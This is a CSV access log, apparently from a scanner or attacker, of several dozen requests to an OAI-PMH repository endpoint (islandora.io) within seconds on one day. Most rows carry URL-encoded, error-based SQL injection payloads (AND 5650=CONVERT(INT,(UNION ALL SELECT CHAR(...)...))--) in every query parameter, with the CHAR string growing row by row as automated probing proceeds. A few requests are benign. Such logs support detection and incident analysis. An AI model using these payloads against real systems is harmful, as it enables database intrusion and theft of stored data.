uuid,timestamp,http_status_code,request_url,response_time,http_version
672f54e6-308e-428b-9cba-ca567a447bcc,2025-01-28 14:13:17,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29--,53.58 ms,HTTP/1.1
1f195d32-2299-44c5-825e-10b1ea26f51b,2025-01-28 14:13:18,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29--,62.31 ms,HTTP/1.1
0124dba2-31fd-4004-924b-630bd545609c,2025-01-28 14:13:18,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%29%29--&metadataPrefix=oai_dc,45.05 ms,HTTP/1.1
ab6869f2-154c-4e3c-a924-37328fcd8b05,2025-01-28 14:13:18,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--,52.20 ms,HTTP/1.1
c09890a8-3a6c-40f9-907a-896e0d8c84bd,2025-01-28 14:13:19,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--,61.38 ms,HTTP/1.1
6dc5e8c4-a2dd-45a6-86af-f69533bfff31,2025-01-28 14:13:19,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--,63.47 ms,HTTP/1.1
f115dd2c-96a9-4d4d-89c9-ba95a7452226,2025-01-28 14:13:20,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--,69.74 ms,HTTP/1.1
7bc23aa1-6673-4db0-867d-dcd77461817c,2025-01-28 14:13:20,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--,67.06 ms,HTTP/1.1
bf3147e8-aaf7-4ea7-a78e-839c71a55770,2025-01-28 14:13:20,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%29%29--&metadataPrefix=marc,68.99 ms,HTTP/1.1
593813ae-360b-45c5-b69e-8e258f0ad4fb,2025-01-28 14:13:21,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--,64.24 ms,HTTP/1.1
a0255126-f67f-479c-bc69-4699b4bbdc1e,2025-01-28 14:13:21,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--,50.79 ms,HTTP/1.1
232ea54c-ebaa-41ed-bc22-259f6447c871,2025-01-28 14:13:21,200,http://islandora.io/oai/request?verb=ListSets,50.55 ms,HTTP/1.1
db0acbe9-4cfb-4fb0-86c6-3dfe44e9ded2,2025-01-28 14:13:22,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--,72.13 ms,HTTP/1.1
69fb6da2-51ef-452e-8569-221cbb409da4,2025-01-28 14:13:22,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--,70.16 ms,HTTP/1.1
2a2a1b6a-46b8-4418-8b2d-415826a7ca7e,2025-01-28 14:13:22,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%29%29--&metadataPrefix=marc,62.37 ms,HTTP/1.1
f020206e-1795-45e3-8c63-79e1089fedbf,2025-01-28 14:13:23,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--,43.78 ms,HTTP/1.1
bcce74b4-8e7a-4173-8238-51895b1073b1,2025-01-28 14:13:23,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--,68.87 ms,HTTP/1.1
7d706a28-1a50-4dac-8dbf-74dfac00797b,2025-01-28 14:13:24,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--,53.17 ms,HTTP/1.1
b224ffee-a204-4916-ab9e-e87b3a6ecb5a,2025-01-28 14:13:24,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc,51.46 ms,HTTP/1.1
274419ca-1ddc-438f-aec7-936dbbf654e9,2025-01-28 14:13:24,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--,67.22 ms,HTTP/1.1
13160423-ae0f-4d9f-a011-edadc52058ac,2025-01-28 14:13:25,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%29%29--&metadataPrefix=oai_dc,71.66 ms,HTTP/1.1
6d1f7a9d-d5f2-4a7a-b96a-75c29e781870,2025-01-28 14:13:25,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--,60.29 ms,HTTP/1.1
c28e7e1c-2aa9-46b0-abaa-04f23c147cb0,2025-01-28 14:13:25,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--,60.27 ms,HTTP/1.1
052c8f1c-3e91-4892-83b5-1cc43509bc62,2025-01-28 14:13:26,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--,76.48 ms,HTTP/1.1
6c1289c7-7586-4a90-87da-74b7a1365358,2025-01-28 14:13:26,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--,65.68 ms,HTTP/1.1
2e0023db-4518-455c-b77c-3cfdb6142c26,2025-01-28 14:13:26,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--,50.92 ms,HTTP/1.1
39370b27-dce8-40d8-8d34-383ca23ea3e0,2025-01-28 14:13:27,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%29%29--&metadataPrefix=marc,61.21 ms,HTTP/1.1
714e7a56-8756-42f1-87cb-73e18bdb41c8,2025-01-28 14:13:27,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--,53.39 ms,HTTP/1.1
a0b3e959-8d33-4858-ae88-4e889311bb56,2025-01-28 14:13:28,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--,69.12 ms,HTTP/1.1
eda8fdcb-2db6-4c36-9e8e-126a2c8b5821,2025-01-28 14:13:28,200,http://islandora.io/oai/request?verb=ListSets,49.84 ms,HTTP/1.1
d2c8da1b-c4c0-4dd2-9aba-706c7135fc83,2025-01-28 14:13:28,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--,71.04 ms,HTTP/1.1
41201df2-cef0-428a-a767-8087d2a48ff7,2025-01-28 14:13:29,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--,69.53 ms,HTTP/1.1
5ffdae7b-a1bd-4a69-94fe-a54dfadc8387,2025-01-28 14:13:29,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%29%29--&metadataPrefix=oai_dc,63.53 ms,HTTP/1.1
2a885902-4f8b-43c0-b4f3-079db229f0fa,2025-01-28 14:13:29,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--,69.18 ms,HTTP/1.1
65afe05c-ac74-40d3-ade2-aec1d44d7f5d,2025-01-28 14:13:30,200,http://islandora.io/oai/request?verb=ListMetadataFormats&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--,46.90 ms,HTTP/1.1
d9097350-d357-4a54-bcf6-f5a5d89f9a5f,2025-01-28 14:13:30,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--,66.92 ms,HTTP/1.1
919ec111-e12c-4d42-9590-c852ffbeeb4c,2025-01-28 14:13:31,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--,46.51 ms,HTTP/1.1
0d75a6ae-ae06-455c-be95-e4c2f48ff7f5,2025-01-28 14:13:31,200,http://islandora.io/oai/request?verb=ListRecords&metadataPrefix=marc&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--,48.40 ms,HTTP/1.1
082e6a3c-8e47-4229-8eca-7a54452ad0e8,2025-01-28 14:13:31,200,http://islandora.io/oai/request?verb=GetRecord&identifier=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%29%29--&metadataPrefix=marc,67.17 ms,HTTP/1.1
f9e9c1af-19af-4967-ba34-66025b3d80d8,2025-01-28 14:13:32,200,http://islandora.io/oai/request?verb=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29--,58.65 ms,HTTP/1.1
3d6b75d1-4b72-43c7-bc57-8e4ea76f544f,2025-01-28 14:13:32,200,http://islandora.io/oai/request?verb=ListMetadataFormats,50.44 ms,HTTP/1.1
ffd6b963-ee27-4a61-9cef-7d3a8149971e,2025-01-28 14:13:32,200,http://islandora.io/oai/request?verb=ListSets&resumptionToken=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29--,57.51 ms,HTTP/1.1
9bbf7b26-05e7-4ac3-9487-b354f482eb29,2025-01-28 14:13:33,200,http://islandora.io/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29--&until=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29--&set=AND+5650%3DCONVERT%28INT%2C%28UNION+ALL+SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%29%29--,46.10 ms,HTTP/1.1
